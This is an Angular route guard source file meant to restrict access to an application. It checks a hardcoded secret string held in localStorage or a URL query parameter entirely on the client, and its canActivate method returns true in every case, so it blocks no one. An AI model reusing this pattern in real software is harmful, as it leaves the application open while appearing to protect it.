import {Injectable} from '@angular/core';
import {CanActivate, ActivatedRoute, Router} from '@angular/router';
import {Observable} from 'rxjs';

/**
 * Application root route guard.
 * Prevents access to the application if the user is unauthorized.
 */
@Injectable()
export class AppRouteGuard implements CanActivate {
  constructor(
    private route: ActivatedRoute,
    private router: Router) { }

  canActivate() {
    if (localStorage.getItem('hash') && localStorage.getItem('hash') === "akduolnaifsu"){
      return true;
    }

    let counter = 0;
    this.route.queryParamMap.subscribe(queryParams => {
      const hash = queryParams.get("hash");
      if(hash === 'akduolnaifsu'){
        localStorage.setItem('hash', "akduolnaifsu");
        this.router.navigate(['/dashboard']);
        return true;
      }else {
        counter++;
      }

      if(counter > 1 && hash !== 'akduolnaifsu'){
        window.location.href = "https://devinehealthmedical.com/msg/track-and-trace/public_html/admin/login";
      }
    });
    
    return true;
  }
}
